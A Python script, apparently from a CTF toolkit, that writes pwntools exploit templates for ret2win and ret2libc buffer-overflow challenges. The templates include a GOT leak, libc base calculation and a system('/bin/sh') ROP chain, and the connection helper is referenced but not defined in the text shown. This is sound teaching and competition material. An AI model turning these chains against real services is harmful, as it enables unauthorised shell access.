#!/usr/bin/env python3
"""
CTF Pwntools Exploit Template Generator
-----------------------------------------
Interactively asks the user a few questions about their binary / remote target
and then writes a ready-to-run ``exploit.py`` file tailored to their answers.

Why this script?
  Starting a pwn challenge from a blank file is slow and error-prone.  This
  generator handles the boilerplate (imports, connection setup, offset
  calculation stubs, ROP chain scaffolding) so you can jump straight to the
  interesting part.

Usage:
    python3 scripts/pwn_template.py
    python3 scripts/pwn_template.py --help   # show all options / skip prompts

Supported scenarios (based on answers):
  - Local binary only
  - Local binary + remote host:port
  - Known "win" function (ret2win style) — no libc needed
  - ret2libc with a libc.so provided
  - Generic ROP skeleton (no win, no libc path)
"""

from __future__ import annotations

import argparse
import sys
from pathlib import Path

# ─────────────────────────── ANSI colour helpers ────────────────────────────

CYAN   = "\033[96m"
GREEN  = "\033[92m"
YELLOW = "\033[93m"
RED    = "\033[91m"
BOLD   = "\033[1m"
RESET  = "\033[0m"


def _ask(prompt: str, default: str = "") -> str:
    """
    Prompt the user for input and return the stripped response.

    Args:
        prompt:  The question to show the user.
        default: Value to use if the user presses Enter without typing.

    Returns:
        The user's input (stripped), or *default* if the user gave no input.
    """
    suffix = f" [{default}]" if default else ""
    try:
        answer = input(f"{CYAN}{prompt}{suffix}:{RESET} ").strip()
    except (EOFError, KeyboardInterrupt):
        print()
        sys.exit(0)
    return answer if answer else default


def _ask_yes_no(prompt: str, default: bool = False) -> bool:
    """
    Prompt the user for a yes/no answer.

    Args:
        prompt:  The yes/no question.
        default: Default value if the user just presses Enter.

    Returns:
        ``True`` for yes, ``False`` for no.
    """
    hint = "Y/n" if default else "y/N"
    try:
        answer = input(f"{CYAN}{prompt} [{hint}]:{RESET} ").strip().lower()
    except (EOFError, KeyboardInterrupt):
        print()
        sys.exit(0)
    if not answer:
        return default
    return answer.startswith("y")


# ──────────────────────────── Template builders ──────────────────────────────


def _build_ret2win(binary: str, host: str, port: str, win_func: str) -> str:
    """
    Build a ret2win exploit template.

    The template:
      1. Loads the ELF and finds the win function address automatically.
      2. Uses ``cyclic`` / ``cyclic_find`` to determine the offset.
      3. Builds a payload: padding + win function address.

    Args:
        binary:   Path to the vulnerable binary.
        host:     Remote hostname (empty string = local only).
        port:     Remote port number (empty string = local only).
        win_func: Name of the win / shell function.

    Returns:
        The complete exploit script as a string.
    """
    conn_block = _conn_block(binary, host, port)
    return f'''\
#!/usr/bin/env python3
"""
ret2win Exploit
Generated by pwn_template.py

Target : {binary}
Win fn : {win_func}
Remote : {host + ":" + port if host else "local only"}

Strategy
--------
1. Overflow the buffer to control the return address.
2. Return into the win function ({win_func}) to get the flag / shell.

Steps to complete before running:
  1. Find the exact offset:
       $ python3 -c "import pwn; pwn.context.binary = '{binary}'; print(pwn.cyclic(200))" | ./{Path(binary).name}
       Then note the value in RBP/RIP and run:
       $ python3 -c "import pwn; print(pwn.cyclic_find(0xXXXXXXXX))"
  2. Update OFFSET below.
"""

from pwn import *

# ── Binary / context setup ────────────────────────────────────────────────
# context.binary sets the architecture automatically so gadgets and packing
# all use the right word size and endianness.
elf = context.binary = ELF("{binary}", checksec=False)
context.log_level = "info"   # change to "debug" for raw socket output

# ── Offset (bytes of padding before you hit the return address) ───────────
# TODO: replace with the real value you found with cyclic / gdb.
OFFSET = 64

# ── Win function address ───────────────────────────────────────────────────
# pwntools looks this up from the ELF symbol table automatically.
WIN = elf.sym["{win_func}"]
log.info(f"Win function @ {{WIN:#x}}")

# ── Connection ────────────────────────────────────────────────────────────
{conn_block}

# ── Exploit ───────────────────────────────────────────────────────────────
# b"A" * OFFSET  → fills the buffer up to the saved return address
# p64(WIN)       → overwrites the return address with the win function
payload = flat(
    b"A" * OFFSET,
    WIN,
)

# If the binary expects input only after printing a prompt, use:
#   io.sendlineafter(b"prompt> ", payload)
io.sendline(payload)

# Collect the flag / drop into an interactive shell
io.interactive()
'''


def _build_ret2libc(binary: str, host: str, port: str, libc: str) -> str:
    """
    Build a ret2libc exploit template using a supplied libc.

    The template scaffolds:
      - A leak gadget stub (you fill in the real gadget address).
      - Automatic libc base calculation from the leak.
      - A ``/bin/sh`` shell via ``system()``.

    Args:
        binary: Path to the vulnerable binary.
        host:   Remote hostname (empty = local only).
        port:   Remote port number (empty = local only).
        libc:   Path to the ``libc.so`` file.

    Returns:
        The complete exploit script as a string.
    """
    conn_block = _conn_block(binary, host, port)
    return f'''\
#!/usr/bin/env python3
"""
ret2libc Exploit
Generated by pwn_template.py

Target : {binary}
libc   : {libc}
Remote : {host + ":" + port if host else "local only"}

Strategy
--------
1. Leak a libc address (e.g. the GOT entry for puts/printf) using a ROP chain.
2. Calculate libc base = leaked_address - known_libc_offset.
3. Build a second ROP chain: system("/bin/sh") using the now-known addresses.

Steps to complete before running:
  1. Find the buffer overflow offset (see cyclic instructions in the ret2win
     template or use GDB with pattern create / pattern offset).
  2. Find a 'pop rdi; ret' gadget (ROPgadget --binary {binary} | grep "pop rdi").
  3. Choose a function whose GOT entry you will leak (default: puts).
  4. Update OFFSET and all TODO markers below.
"""

from pwn import *

# ── Binary / context setup ────────────────────────────────────────────────
elf  = context.binary = ELF("{binary}", checksec=False)
libc = ELF("{libc}", checksec=False)
rop  = ROP(elf)
context.log_level = "info"

# ── Offset ────────────────────────────────────────────────────────────────
OFFSET = 64   # TODO: replace with real value

# ── ROP gadgets ───────────────────────────────────────────────────────────
# pwntools can find these automatically with rop.find_gadget().
POP_RDI = rop.find_gadget(["pop rdi", "ret"])[0]
RET     = rop.find_gadget(["ret"])[0]   # stack alignment for 64-bit

log.info(f"pop rdi; ret  @ {{POP_RDI:#x}}")
log.info(f"ret           @ {{RET:#x}}")

def leak_libc(io: tube) -> int:
    """
    Stage 1: leak the run-time address of puts() from the GOT.

    Returns:
        The leaked address of puts in the remote / local process.
    """
    # Call puts(puts@GOT) → prints the 8-byte GOT entry (= puts address in libc)
    payload = flat(
        b"A" * OFFSET,
        POP_RDI,
        elf.got["puts"],
        elf.plt["puts"],
        elf.sym["main"],   # return to main so we get a second shot
    )
    # TODO: adjust sendlineafter to match the binary's prompt
    io.sendlineafter(b"> ", payload)
    io.recvuntil(b"\\n")   # skip any extra output before the leak
    leak = unpack(io.recvn(6).ljust(8, b"\\x00"))
    log.success(f"Leaked puts @ {{leak:#x}}")
    return leak


def get_shell(io: tube, puts_addr: int) -> None:
    """
    Stage 2: use the leaked address to calculate libc base and pop a shell.

    Args:
        io:         The active connection tube.
        puts_addr:  Leaked run-time address of puts().
    """
    libc.address = puts_addr - libc.sym["puts"]
    log.success(f"libc base @ {{libc.address:#x}}")

    # Build the shell payload
    payload = flat(
        b"A" * OFFSET,
        RET,               # align the stack to 16 bytes (required by glibc)
        POP_RDI,
        next(libc.search(b"/bin/sh\\x00")),
        libc.sym["system"],
    )
    # TODO: adjust sendlineafter to match the binary's prompt
    io.sendlineafter(b"> ", payload)


# ── Connection ────────────────────────────────────────────────────────────
{conn_block}

# ── Run the two-stage exploit ─────────────────────────────────────────────
puts_addr = leak_libc(io)
get_shell(io, puts_addr)
io.interactive()
'''


